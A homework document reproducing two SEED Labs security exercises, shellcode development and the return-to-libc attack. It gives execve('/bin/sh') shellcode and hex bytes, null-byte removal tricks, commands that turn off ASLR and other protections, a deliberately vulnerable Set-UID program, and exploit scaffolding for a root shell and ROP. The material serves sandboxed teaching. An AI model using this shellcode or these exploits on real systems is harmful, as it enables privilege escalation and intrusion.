# Information Security HW03


## 3.1 SEED Lab (20 pts)
Shellcode Development Lab
https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/

### Task 1: Writing Assembly Code

To be able to have a direct control over what instructions to use in a shellcode, the best way to write a
shellcode is to use an assembly language. In this task, we will use a sample program to get familiar with the
development environment.
Assembly languages are different for different computer architectures. In this task, the sample code
(hello.s) is for the amd64 (64-bit) architecture. The code is included in the Labsetup folder. Students
SEED Labs – Shellcode Development Lab 2
working on Apple silicon machines can find the arm version of the sample code in the Labsetup/arm
folder.

##### Listing 1: A sample amd64 assembly program (hello.s)

```hello.s
global _start
section .text
_start:
mov rdi, 1 ; the standard output
mov rsi, msg ; address of the message
mov rdx, 15 ; length of the message
mov rax, 1 ; the number of the write() system call
syscall ; invoke write(1, msg, 15)
mov rdi, 0 ;
mov rax, 60 ; the number for the exit() system call
syscall ; invoke exit(0)
section .rodata
msg: db "Hello, world!", 10
```

##### Compiling to object code

We compile the assembly code above using nasm, which is an assembler and
disassembler for the Intel x86 and x64 architectures. For the arm64 architecture, the corresponding tool is
called as. The -f elf64 option indicates that we want to compile the code to 64-bit ELF binary format.
The Executable and Linkable Format (ELF) is a common standard file format for executable file, object
code, shared libraries. For 32-bit assembly code, elf32 should be used.

```
// For amd64
$ nasm -f elf64 hello.s -o hello.o
// For arm64
$ as -o hello.o hello.s
```

##### Linking to generate final binary

Once we get the object code hello.o, if we want to generate the
executable binary, we can run the linker program ld, which is the last step in compilation. After this step,
we get the final executable code hello. If we run it, it will print out "Hello, world!".

```
// For both amd64 and arm64
$ ld hello.o -o hello
$ ./hello
Hello, world!
```

##### Getting the machine code

In most attacks, we only need the machine code of the shellcode, not a stan-
dalone executable file, which contains data other than the actual machine code. Technically, only the ma-
chine code is called shellcode. Therefore, we need to extract the machine code from the executable file or
the object file. There are various ways to do that. One way is to use the objdump command to disassemble
the executable or object file.
SEED Labs – Shellcode Development Lab 3
For amd64, there are two different common syntax modes for assembly code, one is the AT&T syntax
mode, and the other is Intel syntax mode. By default, objdump uses the AT&T mode. In the following, we
use the -Mintel option to produce the assembly code in the Intel mode.

```
$ objdump -Mintel -d hello.o
hello.o: file format elf64-x86-64
Disassembly of section .text:
0000000000000000 <_start>:
0: bf 01 00 00 00 mov edi,0x1
5: 48 be 00 00 00 00 00 movabs rsi,0x0
c: 00 00 00
f: ba 0f 00 00 00 mov edx,0xf
14: b8 01 00 00 00 mov eax,0x1
19: 0f 05 syscall
1b: bf 00 00 00 00 mov edi,0x0
20: b8 3c 00 00 00 mov eax,0x3c
25: 0f 05 syscall
```

In the above printout, the numbers after the colons are machine code. You can also use the xxd com-
mand to print out the content of the binary file, and you should be able to find out the shellcode’s machine
code from the printout.

```
$ xxd -p -c 20 hello.o
7f454c4602010100000000000000000001003e00
...
000000001800000000000000bf0100000048be00
00000000000000ba0f000000b8010000000f05bf
00000000b83c0000000f05000000000000000000
...
```

#### Task

Your task is to go through the entire process: compiling and running the sample code, and then get
the machine code from the binary.

### Task 2: Writing Shellcode (Approach 1)

The main purpose of shellcode is to actually quite simple: to run a shell program such as /bin/sh. In the
Ubuntu operating system, this can be achieved by invoking the execve() system call.
`execve("/bin/sh", argv[], 0)`
We need to pass three arguments to this system call: In the amd64 architecture, they are are passed
through the rdi, rsi, and rdx registers. In the arm64 architecture, they are passed through the x0, x1,
and x2 registers. The pseudo code is listed below:

```
// For amd64 architrecture
Let rdi = address of the "/bin/sh" string
Let rsi = address of the argv[] array
Let rdx = 0
SEED Labs – Shellcode Development Lab 4
Let rax = 59 // 59 is execve’s system call number
syscall // Invoke execve()
// For the arm64 architrecture
Let x0 = address of the "/bin/sh" string
Let x1 = address of the argv[] array
Let x2 = 0
Let x8 = 221 // 221 is execve’s system call number
svc 0x1337 // Invoke execve()
```

The main challenge of writing a shellcode is how to get the address of the "/bin/sh" string and the
address of the argv[] array? They are two typical approaches:
• Approach 1: Store the string and the array in the code segment, and then get their addresses using the
PC register, which points to the code segment. We focus on this approach in this task.
• Approach 2: Dynamically construct the string and the array on the stack, and then use the stack pointer
register to get their addresses. We focus on this approach in the next task.

#### Task 2.a. Understand the code

We provide a sample shellcode below. This code is for the amd64 architecture. The code can also be found
in the Labsetup folder. If you are working on this lab on an Apple silicon machine, you can find the
sample arm64 code in the arm sub-folder.

```Listing 2: A smaple 64-bit shellcode (mysh64.s)
section .text
global _start
_start:
BITS 64
jmp short two
one:
pop rbx
mov [rbx+8], rbx ; store rbx to memory at address rbx + 8
mov rax, 0x00 ; rax = 0
mov [rbx+16], rax ; store rax to memory at address rbx + 16
mov rdi, rbx ; rdi = rbx ¿
lea rsi, [rbx+8] ; rsi = rbx +8 ¡
mov rdx, 0x00 ; rdx = 0
mov rax, 59 ; rax = 59
syscall
two:
call one
db ’/bin/sh’, 0 ; The command string (terminated by a zero) ¬
db ’AAAAAAAA’ ; Place holder for argv[0]
db ’BBBBBBBB’ ; Place holder for argv[1]
```

The code above first jumps to the instruction at location two, which does another jump (to location
one), but this time, it uses the call instruction. This instruction is for function call, i.e., before it jumps
SEED Labs – Shellcode Development Lab 5
to the target location, it saves the address of the next instruction (i.e., the return address) on the top of the
stack, so when the function returns, it can return to the instruction right after the call instruction.
In this example, the “instruction” right after the call instruction is not actually an instruction; it stores
a string. However, this does not matter, the call instruction will push its address (i.e., the string’s address)
into the stack, in the return address field of the function frame. When we get into the function, i.e., after
jumping to location one, the top of the stack is where the return address is stored. Therefore, the pop rbx
instruction actually get the address of the string on Line ¬, and save it to the rbx register. That is how the
address of the string is obtained.

##### Tasks. Please do the following tasks

1. Compile and run the code, and see whether you can get a shell. The -g option enables the debugging
information, as we will debug the code.

```
// For amd64
$ nasm -g -f elf64 -o mysh64.o mysh64.s
$ ld --omagic -o mysh64 mysh64.o
// For arm64
$ as -g -o mysh64.o mysh64.s
$ ld --omagic -o mysh64 mysh64.o
```

Note. We need to use the `--omagic` option when running the linker program ld. By default, the
code segment is not writable. When this program runs, it needs to modify the data stored in the code
region; if the code segment is not writable, the program will crash. This is not a problem for actual
attacks, because in attacks, the code is typically injected into a writable data segment (e.g. stack or
heap). Usually we do not run shellcode as a standalone program.
2. Use `gdb` to debug the program, and show how the program gets the address of the shell string
`/bin/sh`.
3. Explain how the program constructs the `argv[]` array, and show which lines set the values for
`argv[0]` and `argv[1]`, respectively.
4. Explain the real meaning of Lines 1 and 2.
Common gdb commands. Here are some gdb commands that may be useful to this lab. To know how
to use other gdb commands, inside gdb, you can type help to get a list of command class names. Type
help followed by a class name, and you can get a list of commands in that class.

```
$ gdb mysh64
help -- Print out the help information
break one -- Set a break point at section "one"
run -- Start debugged program.
step -- Step program until it reaches a different source line.
print $rbx -- Print out the value of the rbx register
x/40bx <addr> -- Print out the memory at address <addr>
x/40bx $rsp -- Print out the top 40 bytes of the stack
x/5gx $rsp -- Print out the top 4 double-word (8 bytes) of the stack
quit -- Exit from gdb
```

#### Task 2.b. Eliminate zeros from the code

Shellcode is widely used in buffer-overflow attacks. In many cases, the vulnerabilities are caused by string
copy, such as the strcpy() function. For these string copy functions, zero is considered as the end of the
string. Therefore, if we have a zero in the middle of a shellcode, string copy will not be able to copy anything
after the zero, so the attack will not be able to succeed. Although not all the vulnerabilities have issues with
zeros, it becomes a requirement for shellcode not to have any zero in the machine code; otherwise, the
application of a shellcode will be limited.
The sample code provided in the previous section is not a true shellcode, because it contains several
zeros. Please use the objdump command to get the machine code of the shellcode and mark all the instruc-
tions that have zeros in the machine code.
To eliminate these zeros, you need to rewrite the shellcode mysh64.s, replacing the problematic in-
structions with an alternative. Section 5 provides some approaches that you can use to get rid of zeros.
Please show the revised mysh64.s and explain how you get rid of each single zero from the code.

#### Task 2.c. Run a more complicated command

Inside mysh64.s, we construct the argv[] array for the execve() system call. Since our command is
/bin/sh, without any command-line arguments, our argv array only contains two elements: the first one
is a pointer to the command string, and the second one is zero.
In this task, we need to run the following command, i.e., we want to use execve to execute the follow-
ing command, which uses /bin/bash to execute the "echo hello; ls -la" command.
`/bin/bash -c "echo hello; ls -la"`
In this new command, the argv array should have the following four elements, all of which need to be
constructed on the stack. Please modify mysh64.s and demonstrate your execution result. As usual, you
cannot have any zero in your shellcode.

```
argv[0] = address of the "/bin/bash" string
argv[1] = address of the "-c" string
argv[2] = address of the command string "echo hello; ls -la"
argv[3] = 0
```

#### 3.4 Task 2.d. Pass environment variables

The third parameter for the execve() system call is a pointer to the environment variable array, and it
allows us to pass environment variables to the program. In our sample program, we pass a null pointer to
execve(), so no environment variable is passed to the program. In this task, we will pass some environ-
ment variables.
If we change the command "/bin/sh" in our shellcode mysh64.s to "/usr/bin/env", which
is a command to print out the environment variables. You can find out that when we run our shellcode, there
will be no output, because our process does not have any environment variable.
In this task, we will write a shellcode called myenv64.s. When this program is executed, it executes
the "/usr/bin/env" command, which can print out the following environment variables:

```
$ ./myenv64
aaa=hello
bbb=world
ccc=hello world
```

SEED Labs – Shellcode Development Lab 7
To write such a shellcode, we need to construct an environment variable array on the stack, and store the
address of this array to the rdx register, before invoking execve(). The way to construct this array on
the stack is exactly the same as the way how we construct the argv[] array. See the following:

```
env[0] = address to the "aaa=hello" string
env[1] = address to the "bbb=world" string
env[2] = address to the "ccc=hello world" string
env[3] = 0 // 0 marks the end of the array
```

### Task 3: Writing Shellcode (Approach 2)

Another approach to get the shell string and the argv[] array is to dynamically construct them on the
stack, and then use the stack pointer register to get their addresses. A sample shellcode (for amd64) using
this approach is listed below. Both amd64 and arm64 code can be found from the Labsetup folder.
Brief explanation of the code is given in the comment, but if students want to see a full explanation, they
can find much more detailed explanation of the code in the SEED book.

```Listing 3: Shellcode using the stack approach (another sh64.s)
section .text
global _start
_start:
xor rdx, rdx ; rdx = 0
push rdx ; push 0 into the stack (terminate the string below)
mov rax,’/bin//sh’
push rax ; push the string into the stack
mov rdi, rsp ; rdi = address of the command string
push rdx ; push argv[1]=0 into stack
push rdi ; push argv[0] into stack
mov rsi, rsp ; rsi = address of the argv[] array
xor rax, rax
mov al, 59 ; execve()
syscall
```

We can use the following commands to compile the assemble code into
64-bit binary code:

```
// For amd64
$ nasm -f elf64 mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64
// For arm64
$ as mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64
```

#### Task 3.a. The code example shows how to execute "/bin/sh". In this task, we need to revise the

shellcode, so it can execute a more complicated shell command listed in the following. Please write your
code to achieve this. You need to show that there is no zero in your code.
`/bin/bash -c "echo hello; ls -la"`

#### Task 3.b. Please compare the two approaches in this lab. Which one do you like better, and why?

### 5 Guidelines: Getting Rid of Zeros

There are many techniques that can get rid of zeros from the shellcode. In this section, we discuss some of the
common techniques that you may find useful for this lab. Although the common ideas are the same for both
amd64 and arm64 architectures, the instructions are different. In this section, we use amd64 instructions
as examples. Students can working on Apple silicon machines can find the guidelines from this online
document: Writing ARM64 shellcode (in Ubuntu).
• If we want to assign zero to rax, we can use "mov rax, 0", but doing so, we will get zeros in the
machine code. A typical way to solve this problem is to use "xor rax, rax", i.e., we xor rax
with itself, the result is zero, which is saved to rax.
• If we want to store 0x99 to rax. We cannot just use "mov rax, 0x99", because the second
operand is expanded to 8 bytes, i.e., 0x0000000000000099, which contains seven zeros. To solve
this problem, we can first set rax to zero, and then assign a one-byte number 0x99 to the al register,
which represent the least significant 8 bits of the eax register.
xor rax, rax
mov al, 0x99
• Another way is to use shift. Again, let us store 0x99 to rax. We first store 0xFFFFFFFFFFFF99 to
rax. Second, we shift this register to the left for 56 bits; now rax contains 0x9900000000000000.
Then we shift the register to the right for 56 bits; the most significant 56 bits (7 bytes) will be filled
with 0x00. After that, rax will contain 0x00000000000099.
mov rax, 0xFFFFFFFFFFFFFF99
shl rax, 56
shr rax, 56
• Strings need to be terminated by zero, but if we define a string using the first line of the following,
we will have a zero in the code. To solve this problem, we define a string using the second line, i.e.,
putting a non-zero byte (0xFF) at the end of the string first.
db ’abcdef’, 0x00
db ’abcdef’, 0xFF
After getting the address of the string, we can dynamically change the non-zero byte to 0x00. As-
suming that we have saved the address of the string to rbx. We also know the length of the string
(excluding the zero) is 6; Therefore, we can use the following instructions to replace the 0xFF with
0x00.
xor al, al
mov [rbx+6], al
SEED Labs – Shellcode Development Lab 9

### 6 Submission

You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
have observed. You also need to provide explanation to the observations that are interesting or surprising.
Please also list the important code snippets followed by explanation. Simply attaching code without any
explanation will not receive credits.

### A Using the shellcode in attacking code

In actual attacks, we need to include the shellcode in our attacking code, such as a Python or C program.
We usually store the machine code in an array, but converting the machine code printed above to the array
assignment in Python and C programs is quite tedious if done manually, especially if we need to perform this
process many times in the lab. We wrote the following Python code to help this process. Just copy whatever
you get from the xxd command (only the shellcode part) and paste it to the following code, between the
lines marked by """. The code can be downloaded from the lab’s website.
Listing 4: convert.py

```convert.py
# !/usr/bin/env python3

# Run "xxd -p -c 20 mysh.o", and

# copy and paste the machine code part to the following

ori_sh ="""
31db31c0b0d5cd80
31c050682f2f7368682f62696e89e3505389e131
d231c0b00bcd80
"""
sh = ori_sh.replace("\n", "")
length = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = ’shellcode= (\n’ + ’ "’
for i in range(length):
s += "\\x" + sh[2*i] + sh[2*i+1]
if i > 0 and i % 16 == 15:
s += ’"\n’ + ’ "’
s += ’"\n’ + ").encode(’latin-1’)"
print(s)
```

The convert.py program will print out the following Python code that you can include in your attack
code. It stores the shellcode in a Python array.

```bash
$ ./convert.py
Length of the shellcode: 35
shellcode= (
"\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
"\x0b\xcd\x80"
).encode(’latin-1’)
```

## 3.2 SEED Lab (30 pts)
Return-to-libc Attack Lab
https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_
Libc/

#### 2 Environment Setup

##### 2.1 Note on x86 and x64 Architectures

The return-to-libc attack on the x64 machines (64-bit) is much more difficult than that on the x86 machines
(32-bit). Although the SEED Ubuntu 20.04 VM is a 64-bit machine, we decide to keep using the 32-bit
programs (x64 is compatible with x86, so 32-bit programs can still run on x64 machines). In the future, we
may introduce a 64-bit version for this lab. Therefore, in this lab, when we compile programs using gcc,
we always use the -m32 flag, which means compiling the program into 32-bit binary.

##### 2.2 Turning off countermeasures

You can execute the lab tasks using our pre-built Ubuntu virtual machines. Ubuntu and other Linux dis-
tributions have implemented several security mechanisms to make the buffer-overflow attack difficult. To
simplify our attacks, we need to disable them first.
Address Space Randomization. Ubuntu and several other Linux-based systems use address space ran-
domization to randomize the starting address of heap and stack, making guessing the exact addresses diffi-
cult. Guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this
feature using the following command:
`$ sudo sysctl -w kernel.randomize_va_space=0`
The StackGuard Protection Scheme. The gcc compiler implements a security mechanism called Stack-
Guard to prevent buffer overflows. In the presence of this protection, buffer overflow attacks do not work.
We can disable this protection during the compilation using the -fno-stack-protector option. For example,
to compile a program example.c with StackGuard disabled, we can do the following:
`$ gcc -m32 -fno-stack-protector example.c`
Non-Executable Stack. Ubuntu used to allow executable stacks, but this has now changed. The binary
images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e.,
they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide
whether to make the stack of this running program executable or non-executable. This marking is done
automatically by the recent versions of gcc, and by default, stacks are set to be non-executable. To change
that, use the following option when compiling programs:

```
For executable stack:
$ gcc -m32 -z execstack -o test test.c
For non-executable stack:
$ gcc -m32 -z noexecstack -o test test.c
```

Because the objective of this lab is to show that the non-executable stack protection does not work, you
should always compile your program using the "-z noexecstack" option in this lab.
Configuring /bin/sh. In Ubuntu 20.04, the /bin/sh symbolic link points to the /bin/dash shell.
The dash shell has a countermeasure that prevents itself from being executed in a Set-UID process. If
SEED Labs – Return-to-libc Attack Lab 3
dash is executed in a Set-UID process, it immediately changes the effective user ID to the process’s real
user ID, essentially dropping its privilege.
Since our victim program is a Set-UID program, and our attack uses the system() function to
run a command of our choice. This function does not run our command directly; it invokes /bin/sh
to run our command. Therefore, the countermeasure in /bin/dash immediately drops the Set-UID
privilege before executing our command, making our attack more difficult. To disable this protection, we
link /bin/sh to another shell that does not have such a countermeasure. We have installed a shell program
called zsh in our Ubuntu 16.04 VM. We use the following commands to link /bin/sh to zsh:
`$ sudo ln -sf /bin/zsh /bin/sh`
It should be noted that the countermeasure implemented in dash can be circumvented. We will do that
in a later task.

#### 2.3 The Vulnerable Program

Listing 1: The vulnerable program (retlib.c)

```c
# include <stdlib.h>

# include <stdio.h>

# include <string.h>

# ifndef BUF_SIZE

# define BUF_SIZE 12

# endif

int bof(char *str)
{
char buffer[BUF_SIZE];
unsigned int *framep;
// Copy ebp into framep
asm("movl %%ebp, %0" : "=r" (framep));
/* print out information for experiment purpose*/
printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);
strcpy(buffer, str);fi buffer overflow!
return 1;
}
int main(int argc, char **argv)
{
char input[1000];
FILE *badfile;
badfile = fopen("badfile", "r");
int length = fread(input, sizeof(char), 1000, badfile);
printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
printf("Input size: %d\n", length);
SEED Labs – Return-to-libc Attack Lab 4
bof(input);
printf("(ˆ_ˆ)(ˆ_ˆ) Returned Properly (ˆ_ˆ)(ˆ_ˆ)\n");
return 1;
}
// This function will be used in the optional task
void foo(){
static int i = 1;
printf("Function foo() is invoked %d times\n", i++);
return;
}
```

The above program has a buffer overflow vulnerability. It first reads an input up to 1000 bytes from
a file called badfile. It then passes the input data to the bof() function, which copies the input to its
internal buffer using strcpy(). However, the internal buffer’s size is less than 1000, so here is potential
buffer-overflow vulnerability.
This program is a root-owned Set-UID program, so if a normal user can exploit this buffer overflow
vulnerability, the user might be able to get a root shell. It should be noted that the program gets its input
from a file called badfile, which is provided by users. Therefore, we can construct the file in a way such
that when the vulnerable program copies the file contents into its buffer, a root shell can be spawned.

##### Compilation

Let us first compile the code and turn it into a root-owned Set-UID program. Do not forget

to include the -fno-stack-protector option (for turning off the StackGuard protection) and the "-z
noexecstack" option (for turning on the non-executable stack protection). It should also be noted that
changing ownership must be done before turning on the Set-UID bit, because ownership changes cause
the Set-UID bit to be turned off. All these commands are included in the provided Makefile.

```
// Note: N should be replaced by the value set by the instructor
$ gcc -m32 -DBUF_SIZE=N -fno-stack-protector -z noexecstack -o retlib retlib.c
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```

##### For instructors

To prevent students from using the solutions from the past (or from those posted on the
Internet), instructors can change the value for BUF SIZE by requiring students to compile the code using
a different BUF SIZE value. Without the -DBUF SIZE option, BUF SIZE is set to the default value 12
(defined in the program). When this value changes, the layout of the stack will change, and the solution
will be different. Students should ask their instructors for the value of N. The value of N can be set in the
provided Makefile and N can be from 10 to 800.

### 3 Lab Tasks

#### 3.1 Task 1: Finding out the Addresses of libc Functions

In Linux, when a program runs, the libc library will be loaded into memory. When the memory address
randomization is turned off, for the same program, the library is always loaded in the same memory address
(for different programs, the memory addresses of the libc library may be different). Therefore, we can
easily find out the address of system() using a debugging tool such as gdb. Namely, we can debug the
SEED Labs – Return-to-libc Attack Lab 5
target program retlib. Even though the program is a root-owned Set-UID program, we can still debug
it, except that the privilege will be dropped (i.e., the effective user ID will be the same as the real user ID).
Inside gdb, we need to type the run command to execute the target program once, otherwise, the library
code will not be loaded. We use the p command (or print) to print out the address of the system() and
exit() functions (we will need exit() later on).

```bash
$ touch badfile
$ gdb -q retlibŸ Use "Quiet" mode
Reading symbols from ./retlib...
(No debugging symbols found in ./retlib)
gdb-peda$ break main
Breakpoint 1 at 0x1327
gdb-peda$ run
......
Breakpoint 1, 0x56556327 in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e12420 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
gdb-peda$ quit
```

It should be noted that even for the same program, if we change it from a Set-UID program to a
non-Set-UID program, the libc library may not be loaded into the same location. Therefore, when we
debug the program, we need to debug the target Set-UID program; otherwise, the address we get may be
incorrect.
Running gdb in batch mode. If you prefer to run gdb in a batch mode, you can put the gdb commands
in a file, and then ask gdb to execute the commands from this file:

```
$ cat gdb_command.txt
break main
run
p system
p exit
quit
$ gdb -q -batch -x gdb_command.txt ./retlib
...
Breakpoint 1, 0x56556327 in main ()
$1 = {<text variable, no debug info>} 0xf7e12420 <system>
$2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
```

#### 3.2 Task 2: Putting the shell string in the memory

Our attack strategy is to jump to the system() function and get it to execute an arbitrary command.
Since we would like to get a shell prompt, we want the system() function to execute the "/bin/sh"
program. Therefore, the command string "/bin/sh" must be put in the memory first and we have to know
its address (this address needs to be passed to the system() function). There are many ways to achieve
these goals; we choose a method that uses environment variables. Students are encouraged to use other
approaches.
When we execute a program from a shell prompt, the shell actually spawns a child process to execute the
program, and all the exported shell variables become the environment variables of the child process. This
SEED Labs – Return-to-libc Attack Lab 6
creates an easy way for us to put some arbitrary string in the child process’s memory. Let us define a new
shell variable MYSHELL, and let it contain the string "/bin/sh". From the following commands, we can
verify that the string gets into the child process, and it is printed out by the env command running inside
the child process.

```
$ export MYSHELL=/bin/sh
$ env | grep MYSHELL
MYSHELL=/bin/sh
```

We will use the address of this variable as an argument to system() call. The location of this variable
in the memory can be found out easily using the following program:

```
void main(){
char* shell = getenv("MYSHELL");
if (shell)
printf("%x\n", (unsigned int)shell);
}
```

Compile the code above into a binary called prtenv. If the address randomization is turned off, you
will find out that the same address is printed out. When you run the vulnerable program retlib inside the
same terminal, the address of the environment variable will be the same (see the special note below). You
can verify that by putting the code above inside retlib.c. However, the length of the program name does
make a difference. That’s why we choose 6 characters for the program name prtenv to match the length
of retlib.

##### Note

You should use the -m32 flag when compiling the above program, so the binary code prtenv will
be for 32-bit machines, instead of for 64-bit ones. The vulnerable program retlib is a 32-bit binary, so if
prtenv is 64-bit, the address of the environment variable will be different.

#### 3.3 Task 3: Launching the Attack

We are ready to create the content of badfile. Since the content involves some binary data (e.g., the
address of the libc functions), we can use Python to do the construction. We provide a skeleton of the
code in the following, with the essential parts left for you to fill out.

```py
# !/usr/bin/env python3

import sys

# Fill content with non-zero values

content = bytearray(0xaa for i in range(300))
X = 0
sh_addr = 0x00000000 # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder=’little’)
Y = 0
system_addr = 0x00000000 # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder=’little’)
Z = 0
exit_addr = 0x00000000 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder=’little’)
SEED Labs – Return-to-libc Attack Lab 7

# Save content to a file

with open("badfile", "wb") as f:
f.write(content)
```

You need to figure out the three addresses and the values for X, Y, and Z. If your values are incorrect,
your attack might not work. In your report, you need to describe how you decide the values for X, Y and Z.
Either show us your reasoning or, if you use a trial-and-error approach, show your trials.

##### A note regarding gdb

If you use gdb to figure out the values for X, Y, and Z, it should be noted that the
gdb behavior in Ubuntu 20.04 is slightly different from that in Ubuntu 16.04. In particular, after we set a
break point at function bof, when gdb stops inside the bof() function, it stops before the ebp register is
set to point to the current stack frame, so if we print out the value of ebp here, we will get the caller’s ebp
value, not bof’s ebp. We need to type next to execute a few instructions and stop after the ebp register
is modified to point to the stack frame of the bof() function. The SEED book (2nd edition) is based on
Ubuntu 16.04, so it does not have this next step.

##### Attack variation 1: Is the exit() function really necessary? Please try your attack without including

the address of this function in badfile. Run your attack again, report and explain your observations.

##### Attack variation 2: After your attack is successful, change the file name of retlib to a different name

making sure that the length of the new file name is different. For example, you can change it to newretlib.
Repeat the attack (without changing the content of badfile). Will your attack succeed or not? If it does
not succeed, explain why.

#### 3.4 Task 4: Defeat Shell’s countermeasure

The purpose of this task is to launch the return-to-libc attack after the shell’s countermeasure is enabled.
Before doing Tasks 1 to 3, we relinked /bin/sh to /bin/zsh, instead of to /bin/dash (the original
setting). This is because some shell programs, such as dash and bash, have a countermeasure that auto-
matically drops privileges when they are executed in a Set-UID process. In this task, we would like to
defeat such a countermeasure, i.e., we would like to get a root shell even though the /bin/sh still points
to /bin/dash. Let us first change the symbolic link back:
`$ sudo ln -sf /bin/dash /bin/sh`
Although dash and bash both drop the Set-UID privilege, they will not do that if they are invoked
with the -p option. When we return to the system function, this function invokes /bin/sh, but it does
not use the -p option. Therefore, the Set-UID privilege of the target program will be dropped. If there
is a function that allows us to directly execute "/bin/bash -p", without going through the system
function, we can still get the root privilege.
There are actually many libc functions that can do that, such as the exec() family of functions, includ-
ing execl(), execle(), execv(), etc. Let’s take a look at the execv() function.
`int execv(const char *pathname, char*const argv[]);`
This function takes two arguments, one is the address to the command, the second is the address to the
argument array for the command. For example, if we want to invoke "/bin/bash -p" using execv,
we need to set up the following:

```
pathname = address of "/bin/bash"
argv[0] = address of "/bin/bash"
argv[1] = address of "-p"
argv[2] = NULL (i.e., 4 bytes of zero).
```

From the previous tasks, we can easily get the address of the two involved strings. Therefore, if we can
construct the argv[] array on the stack, get its address, we will have everything that we need to conduct
the return-to-libc attack. This time, we will return to the execv() function.
There is one catch here. The value of argv[2] must be zero (an integer zero, four bytes). If we put
four zeros in our input, strcpy() will terminate at the first zero; whatever is after that will not be copied
into the bof() function’s buffer. This seems to be a problem, but keep in mind, everything in your input is
already on the stack; they are in the main() function’s buffer. It is not hard to get the address of this buffer.
To simplify the task, we already let the vulnerable program print out that address for you.
Just like in Task 3, you need to construct your input, so when the bof() function returns, it returns
to execv(), which fetches from the stack the address of the "/bin/bash" string and the address of
the argv[] array. You need to prepare everything on the stack, so when execv() gets executed, it can
execute "/bin/bash -p" and give you the root shell. In your report, please describe how you construct
your input.

#### 3.5 Task 5 (Optional): Return-Oriented Programming

There are many ways to solve the problem in Task 4. Another way is to invoke setuid(0) before invoking
system(). The setuid(0) call sets both real user ID and effective user ID to 0, turning the process
into a non-Set-UID one (it still has the root privilege). This approach requires us to chain two functions
together. The approach was generalized to chaining multiple functions together, and was further generalized
to chain multiple pieces of code together. This led to the Return-Oriented Programming (ROP).
Using ROP to solve the problem in Task 4 is quite sophisticated, and it is beyond the scope of this lab.
However, we do want to give students a taste of ROP, asking them to work on a special case of ROP. In the
retlib.c program, there is a function called foo(), which is never called in the program. That function
is intended for this task. Your job is to exploit the buffer-overflow problem in the program, so when the
program returns from the bof() function, it invokes foo() 10 times, before giving you the root shell. In
your lab report, you need to describe how your input is constructed. Here is what the results will look like.

```bash
$ ./retlib
...
Function foo() is invoked 1 times
Function foo() is invoked 2 times
Function foo() is invoked 3 times
Function foo() is invoked 4 times
Function foo() is invoked 5 times
Function foo() is invoked 6 times
Function foo() is invoked 7 times
Function foo() is invoked 8 times
Function foo() is invoked 9 times
Function foo() is invoked 10 times
bash-5.0#fi Got root shell!
```

##### Guidelines

Let’s review what we did in Task 3. We constructed the data on the stack, such that when
the program returns from bof(), it jumps to the system() function, and when system() returns,
SEED Labs – Return-to-libc Attack Lab 9
the program jumps to the exit() function. We will use a similar strategy here. Instead of jumping to
system() and exit(), we will construct the data on the stack, such that when the program returns from
bof, it returns to foo; when foo returns, it returns to another foo. This is repeated for 10 times. When
the 10th foo returns, it returns to the execv() function to give us the root shell.
Further readings. What we did in this task is just a special case of ROP. You may have noticed that the
foo() function does not take any argument. If it does, invoking it 10 times will become signficantly more
complicated. A generic ROP technique allows you to invoke any number of functions in a sequence, allow-
ing each function to have multiple arguments. The SEED book (2nd edition) provides detailed instructions
on how to use the generic ROP technique to solve the problem in Task 4. It involves calling sprintf()
four times, followed by an invocation of setuid(0), before invoking system("/bin/sh") to give us
the root shell. The method is quite complicated and takes 15 pages to explain in the SEED book.

### 4 Guidelines: Understanding the Function Call Mechanism

#### 4.1 Understanding the stack layout

To know how to conduct Return-to-libc attacks, we need to understand how stacks work. We use a small C
program to understand the effects of a function invocation on the stack. More detailed explanation can be
found in the SEED book and SEED lecture.
/*foobar.c*/

```
# include<stdio.h>

void foo(int x)
{
printf("Hello world: %d\n", x);
}
int main()
{
foo(1);
return 0;
}
```

We can use "gcc -m32 -S foobar.c" to compile this program to the assembly code. The result-
ing file foobar.s will look like the following:

```
......
8 foo:
9 pushl %ebp
10 movl %esp, %ebp
11 subl $8, %esp
12 movl 8(%ebp), %eax
13 movl %eax, 4(%esp)
14 movl $.LC0, (%esp) : string "Hello world: %d\n"
15 call printf
16 leave
17 ret
......
21 main:
22 leal 4(%esp), %ecx
SEED Labs – Return-to-libc Attack Lab 10
23 andl $-16, %esp
24 pushl -4(%ecx)
25 pushl %ebp
26 movl %esp, %ebp
27 pushl %ecx
28 subl $4, %esp
29 movl $1, (%esp)
30 call foo
31 movl $0, %eax
32 addl $4, %esp
33 popl %ecx
34 popl %ebp
35 leal -4(%ecx), %esp
36 ret
```

#### 4.2 Calling and entering foo()

Let us concentrate on the stack while calling foo(). We can ignore the stack before that. Please note that
line numbers instead of instruction addresses are used in this explanation.

![alt text](image.png)

Figure 1: Entering and Leaving foo()
• Line 28-29:: These two statements push the value 1, i.e. the argument to the foo(), into the stack.
This operation increments %esp by four. The stack after these two statements is depicted in Fig-
ure 1(a).
• Line 30: call foo: The statement pushes the address of the next instruction that immediately
follows the call statement into the stack (i.e the return address), and then jumps to the code of
foo(). The current stack is depicted in Figure 1(b).
SEED Labs – Return-to-libc Attack Lab 11
• Line 9-10: The first line of the function foo() pushes %ebp into the stack, to save the previous
frame pointer. The second line lets %ebp point to the current frame. The current stack is depicted in
